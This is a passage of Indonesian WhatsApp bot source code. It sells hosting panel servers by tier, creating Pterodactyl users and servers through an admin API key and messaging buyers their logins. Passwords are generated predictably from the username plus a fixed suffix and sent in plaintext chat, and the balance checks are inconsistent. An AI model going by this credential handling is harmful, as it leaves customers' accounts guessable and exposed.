ᴊɪᴋᴀ ɪɴɢɪɴ ᴍᴇᴍʙᴀɴᴛᴀʟ ᴋᴀɴ ᴛᴀʀᴀɴꜱᴀᴋꜱɪ ᴋᴇᴛɪᴋ ᴄᴏɴᴛᴏʜ .ᴛʀxɢᴀɢᴀʟ ( reply pesan )=`
kyy.sendMessage(from, { image: { url: "https://telegra.ph/file/1eaf8f5b4ac0260d005b7.jpg" }, caption: teks28 }, { quoted: fcall })
}
break
case 'trxgagal': {
reply(`OKE KAK TRANSAKSI ANDA TELAH DI GAGALKAN JIKA INGING MEMBUAT QRIS INGAT JEDA YA KAK`)
}
break
                        case 'buyschanakov5': {
if (cekSaldo(sender,db_saldo) < 30000) return kyy.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp30.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
let d = (await kyy.onWhatsApp(sender.split('@')[0]))[0] || {}
minSaldo(sender, 30000, db_saldo)
reply(`Wait Sc Sedang Kami Proses⏳`) 
const baby2 = await mediafireDl('https://www.mediafire.com/file/m1gt0efwipfgd1e/Hanako+V4.0.5.zip/file')
kyy.sendMessage(from, { document : { url : baby2[0].link}, fileName : baby2[0].nama, mimetype: baby2[0].mime }, {quoted:m})}
break
case "1gbsaldo": {
if (cekSaldo(sender,db_saldo) < 1000) return kyy.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp1.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
let t = text.split(',');
if (t.length < 2) return reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
if (global.db.data.users[m.sender].db_saldo < 1) return reply('💸 *Uang Kamu Habis*') // respon ketika limit habis
                db.data.users[m.sender].db_saldo -= 1000
reply('💸 *Rp.1.000 Digunakan*')
let username = t[0];
let u = t[1] + '@s.whatsapp.net'
let name = username + "1GB"
let egg = global.eggsnya
let loc = global.location
let memo = "1024"
let cpu = "50"
let disk = "0"
let email = username + "1398@gmail.com"
akunlo = "https://telegra.ph/file/440546854e464e04c1427.png" 
if (!u) return
let d = (await kyy.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "001"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
}
})
m.reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

 *👤USERNAME* : ${user.username}
 *🔐PASSWORD* : ${password}
 *🌐LOGIN* : ${domain}

NOTE :
• OWNER HANYA MENGIRIM 1X DATA 
AKUN ANDA MOHON DI SIMPAN BAIK BAIK
KALAU DATA AKUN ANDA HILANG OWNER
TIDAK DAPAT MENGIRIM AKUN ANDA LAGI
• GARANSI CUMA 1X
• KLAIM GARANSI HARUS SEND BUKTI PEMBELIAN
`
kyy.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: kyy.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes

}

break
case "2gbsaldo": {
if (cekSaldo(sender,db_saldo) < 2000) return kyy.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp2.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
let t = text.split(',');
if (t.length < 2) return reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
if (global.db.data.users[m.sender].db_saldo < 1) return reply('💸 *Uang Kamu Habis*') // respon ketika limit habis
                db.data.users[m.sender].db_saldo -= 2000
reply('💸 *Rp.2.000 Digunakan*')
let username = t[0];
let u = t[1] + '@s.whatsapp.net'
let name = username + "2GB"
let egg = global.eggsnya
let loc = global.location
let memo = "2048"
let cpu = "70"
let disk = "0"
let email = username + "1398@gmail.com"
akunlo = "https://telegra.ph/file/440546854e464e04c1427.png" 
if (!u) return
let d = (await kyy.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "001"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
}
})
m.reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

⎙─➤ *👤USERNAME* : ${user.username}
⎙─➤ *🔐PASSWORD* : ${password}
⎙─➤ *🌐LOGIN* : ${domain}

NOTE:
• OWNER HANYA MENGIRIM 1X DATA 
AKUN ANDA MOHON DI SIMPAN BAIK BAIK
KALAU DATA AKUN ANDA HILANG OWNER
TIDAK DAPAT MENGIRIM AKUN ANDA LAGI
• GARANSI CUMA 1X
• KLAIM GARANSI HARUS SEND BUKTI PEMBELIAN
=====================================
`
kyy.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: kyy.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes

}

break
case "3gbsaldo": {
if (cekSaldo(sender,db_saldo) < 3000) return kyy.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp3.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
let t = text.split(',');
if (t.length < 2) return reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
if (global.db.data.users[m.sender].db_saldo < 1) return reply('💸 *Uang Kamu Habis*') // respon ketika limit habis
                db.data.users[m.sender].db_saldo -= 3000
reply('💸 *Rp.3.000 Digunakan*')
let username = t[0];
let u = t[1] + '@s.whatsapp.net'
let name = username + "3GB"
let egg = global.eggsnya
let loc = global.location
let memo = "3072"
let cpu = "100"
let disk = "0"
let email = username + "1398@gmail.com"
akunlo = "https://telegra.ph/file/440546854e464e04c1427.png" 
if (!u) return
let d = (await kyy.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "001"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
}
})
m.reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

⎙─➤ *👤USERNAME* : ${user.username}
⎙─➤ *🔐PASSWORD* : ${password}
⎙─➤ *🌐LOGIN* : ${domain}

NOTE :
OWNER HANYA MENGIRIM 1X DATA 
AKUN ANDA MOHON DI SIMPAN BAIK BAIK
KALAU DATA AKUN ANDA HILANG OWNER
TIDAK DAPAT MENGIRIM AKUN ANDA LAGI
• GARANSI CUMA 1X
• KLAIM GARANSI HARUS SEND BUKTI PEMBELIAN
=====================================
`
kyy.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: kyy.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes

}
break
case "4gbsaldo": {
if (cekSaldo(sender,db_saldo) < 4000) return kyy.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp4.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
let t = text.split(',');
if (t.length < 2) return reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
if (global.db.data.users[m.sender].db_saldo < 1) return reply('💸 *Uang Kamu Habis*') // respon ketika limit habis
                db.data.users[m.sender].db_saldo -= 4000
reply('💸 *Rp.4.000 Digunakan*')
let username = t[0];
let u = t[1] + '@s.whatsapp.net'
let name = username + "4"
let egg = global.eggsnya
let loc = global.location
let memo = "4048"
let cpu = "125"
let disk = "4000"
let email = username + "1398@gmail.com"
akunlo = "https://telegra.ph/file/440546854e464e04c1427.png" 
if (!u) return
let d = (await kyy.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "001"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
}
})
m.reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

⎙─➤ *👤USERNAME* : ${user.username}
⎙─➤ *🔐PASSWORD* : ${password}
⎙─➤ *🌐LOGIN* : ${domain}


`
kyy.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: kyy.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes

}

break
case "5gbsaldo": {
if (cekSaldo(sender,db_saldo) < 5000) return kyy.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp5.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
let t = text.split(',');
if (t.length < 2) return reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
if (global.db.data.users[m.sender].db_saldo < 1) return reply('💸 *Uang Kamu Habis*') // respon ketika limit habis
                db.data.users[m.sender].db_saldo -= 5000
reply('💸 *Rp.5.000 Digunakan*')
let username = t[0];
let u = t[1] + '@s.whatsapp.net'
let name = username + "5GB"
let egg = global.eggsnya
let loc = global.location
let memo = "5138"
let cpu = "150"
let disk = "0"
let email = username + "1398@gmail.com"
akunlo = "https://telegra.ph/file/440546854e464e04c1427.png" 
if (!u) return
let d = (await kyy.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "0011"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
}
})
m.reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

⎙─➤ *👤USERNAME* : ${user.username}
⎙─➤ *🔐PASSWORD* : ${password}
⎙─➤ *🌐LOGIN* : ${domain}

*NOTE : OWNER HANYA MENGIRIM 1X DATA AKUN ANDA MOHON DI SIMPAN BAIK BAIK KALAU DATA AKUN ANDA HILANG OWNER TIDAK DAPAT MENGIRIM AKUN ANDA LAGI*
• ɢᴀʀᴀɴsɪ ᴄᴜᴍᴀ 1x
• ᴋʟᴀɪᴍ ɢᴀʀᴀɴsɪ ʜᴀʀᴜs sᴇɴᴅ ʙᴜᴋᴛɪ ᴘᴇᴍʙᴇʟɪᴀɴ
• ᴊᴀɴɢᴀɴ ʀᴜsᴜʜ sᴇʀᴠᴇʀ ʟᴀɪɴ
• ᴄʀᴇᴀᴛ ᴘᴀɴᴇʟ sᴇᴄᴜᴋᴜᴘɴʏᴀ

GROUP OFICIAL
• https://chat.whatsapp.com/G7zBGPIRHPrKwR77jANGHY

OWNER
wa.me/+6288286326619
`
kyy.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: kyy.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes

}

break
case "6gbsaldo": {
if (cekSaldo(sender,db_saldo) < 6000) return kyy.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp6.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
let t = text.split(',');
if (t.length < 2) return reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
if (global.db.data.users[m.sender].db_saldo < 1) return reply('💸 *Uang Kamu Habis*') // respon ketika limit habis
                db.data.users[m.sender].db_saldo -= 6000
reply('💸 *Rp.6.000 Digunakan*')
let username = t[0];
let u = t[1] + '@s.whatsapp.net'
let name = username 
let egg = global.eggsnya
let loc = global.location
let memo = "6000"
let cpu = "175"
let disk = "6000"
let email = username + "1398@gmail.com"
akunlo = "https://telegra.ph/file/440546854e464e04c1427.png" 
if (!u) return
let d = (await kyy.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "009118"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
}
})
m.reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

⎙─➤ *👤USERNAME* : ${user.username}
⎙─➤ *🔐PASSWORD* : ${password}
⎙─➤ *🌐LOGIN* : ${domain}

*NOTE : OWNER HANYA MENGIRIM 1X DATA AKUN ANDA MOHON DI SIMPAN BAIK BAIK KALAU DATA AKUN ANDA HILANG OWNER TIDAK DAPAT MENGIRIM AKUN ANDA LAGI*
• ɢᴀʀᴀɴsɪ ᴄᴜᴍᴀ 1x
• ᴋʟᴀɪᴍ ɢᴀʀᴀɴsɪ ʜᴀʀᴜs sᴇɴᴅ ʙᴜᴋᴛɪ ᴘᴇᴍʙᴇʟɪᴀɴ
• ᴊᴀɴɢᴀɴ ʀᴜsᴜʜ sᴇʀᴠᴇʀ ʟᴀɪɴ
• ᴄʀᴇᴀᴛ ᴘᴀɴᴇʟ sᴇᴄᴜᴋᴜᴘɴʏᴀ

GROUP OFICIAL
• https://chat.whatsapp.com/G7zBGPIRHPrKwR77jANGHY

OWNER
wa.me/+6288286326619
`
kyy.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: kyy.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes

}

break
case "7gbsaldo": {
if (cekSaldo(sender,db_saldo) < 7000) return kyy.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp7.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
let t = text.split(',');
if (t.length < 2) return reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
if (global.db.data.users[m.sender].db_saldo < 1) return reply('💸 *Uang Kamu Habis*') // respon ketika limit habis
                db.data.users[m.sender].db_saldo -= 7000
reply('💸 *Rp.7.000 Digunakan*')
let username = t[0];
let u = t[1] + '@s.whatsapp.net'
let name = username 
let egg = global.eggsnya
let loc = global.location
let memo = "7000"
let cpu = "175"
let disk = "7000"
let email = username + "1398@gmail.com"
akunlo = "https://telegra.ph/file/440546854e464e04c1427.png" 
if (!u) return
let d = (await kyy.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "009118"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
}
})
m.reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

⎙─➤ *👤USERNAME* : ${user.username}
⎙─➤ *🔐PASSWORD* : ${password}
⎙─➤ *🌐LOGIN* : ${domain}

*NOTE : OWNER HANYA MENGIRIM 1X DATA AKUN ANDA MOHON DI SIMPAN BAIK BAIK KALAU DATA AKUN ANDA HILANG OWNER TIDAK DAPAT MENGIRIM AKUN ANDA LAGI*
• ɢᴀʀᴀɴsɪ ᴄᴜᴍᴀ 1x
• ᴋʟᴀɪᴍ ɢᴀʀᴀɴsɪ ʜᴀʀᴜs sᴇɴᴅ ʙᴜᴋᴛɪ ᴘᴇᴍʙᴇʟɪᴀɴ
• ᴊᴀɴɢᴀɴ ʀᴜsᴜʜ sᴇʀᴠᴇʀ ʟᴀɪɴ
• ᴄʀᴇᴀᴛ ᴘᴀɴᴇʟ sᴇᴄᴜᴋᴜᴘɴʏᴀ

GROUP OFICIAL
• https://chat.whatsapp.com/G7zBGPIRHPrKwR77jANGHY

OWNER
wa.me/+6288286326619
`
kyy.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: kyy.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes

}

break
case "unlisaldo": {
if (cekSaldo(sender,db_saldo) < 10000) return kyy.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp10.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
let t = text.split(',');
if (t.length < 2) return reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
if (global.db.data.users[m.sender].db_saldo < 1) return reply('💸 *Uang Kamu Habis*') // respon ketika limit habis
                db.data.users[m.sender].db_saldo -= 10000
reply('💸 *Rp.10.000 Digunakan*')
let username = t[0];
let u = t[1] + '@s.whatsapp.net'
let name = username + "Unli"
let egg = global.eggsnya
let loc = global.location
let memo = "0"
let cpu = "0"
let disk = "0"
let email = username + "1398@gmail.com"
akunlo = "https://telegra.ph/file/440546854e464e04c1427.png" 
if (!u) return
let d = (await kyy.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "001"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
}
})
m.reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

⎙─➤ *👤USERNAME* : ${user.username}
⎙─➤ *🔐PASSWORD* : ${password}
⎙─➤ *🌐LOGIN* : ${domain}

*NOTE : OWNER HANYA MENGIRIM 1X DATA AKUN ANDA MOHON DI SIMPAN BAIK BAIK KALAU DATA AKUN ANDA HILANG OWNER TIDAK DAPAT MENGIRIM AKUN ANDA LAGI*
• ɢᴀʀᴀɴsɪ ᴄᴜᴍᴀ 1x
• ᴋʟᴀɪᴍ ɢᴀʀᴀɴsɪ ʜᴀʀᴜs sᴇɴᴅ ʙᴜᴋᴛɪ ᴘᴇᴍʙᴇʟɪᴀɴ
• ᴊᴀɴɢᴀɴ ʀᴜsᴜʜ sᴇʀᴠᴇʀ ʟᴀɪɴ
• ᴄʀᴇᴀᴛ ᴘᴀɴᴇʟ sᴇᴄᴜᴋᴜᴘɴʏᴀ

GROUP OFICIAL
• https://chat.whatsapp.com/G7zBGPIRHPrKwR77jANGHY

OWNER
wa.me/+6288286326619
`
kyy.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: kyy.chat })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(domain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes

}

break
case "8gbsaldo": {
if (cekSaldo(sender,db_saldo) < 8000) return kyy.sendMessage(from, { text: `Maaf *@${sender.split('@')[0]}*, sepertinya saldo kamu kurang dari Rp8.000 Silahkan melakukan deposit terlebih dahulu sebelum ${command}`, mentions: [sender]}, { quoted: m })
let t = text.split(',');
if (t.length < 2) return reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
if (global.db.data.users[m.sender].db_saldo < 1) return reply('💸 *Uang Kamu Habis*') // respon ketika limit habis
                db.data.users[m.sender].db_saldo -= 8000
reply('💸 *Rp.8.000 Digunakan*')
let username = t[0];
let u = t[1] + '@s.whatsapp.net'
let name = username 
let egg = global.eggsnya
let loc = global.location
let memo = "8000"
let cpu = "200"
let disk = "8000"
let email = username + "1398@gmail.com"
akunlo = "https://telegra.ph/file/440546854e464e04c1427.png" 
if (!u) return
let d = (await kyy.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + "009118"
let f = await fetch(domain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey2
}
})
m.reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

⎙─➤ *👤USERNAME* : ${user.username}
⎙─➤ *🔐PASSWORD* : ${password}
⎙─➤ *🌐LOGIN* : ${domain}

*NOTE : OWNER HANYA MENGIRIM 1X DATA AKUN ANDA MOHON DI SIMPAN BAIK BAIK KALAU DATA AKUN ANDA HILANG OWNER TIDAK DAPAT MENGIRIM AKUN ANDA LAGI*
• ɢᴀʀᴀɴsɪ ᴄᴜᴍᴀ 1x
• ᴋʟᴀɪᴍ ɢᴀʀᴀɴsɪ ʜᴀʀᴜs sᴇɴᴅ ʙᴜᴋᴛɪ ᴘᴇᴍʙᴇʟɪᴀɴ
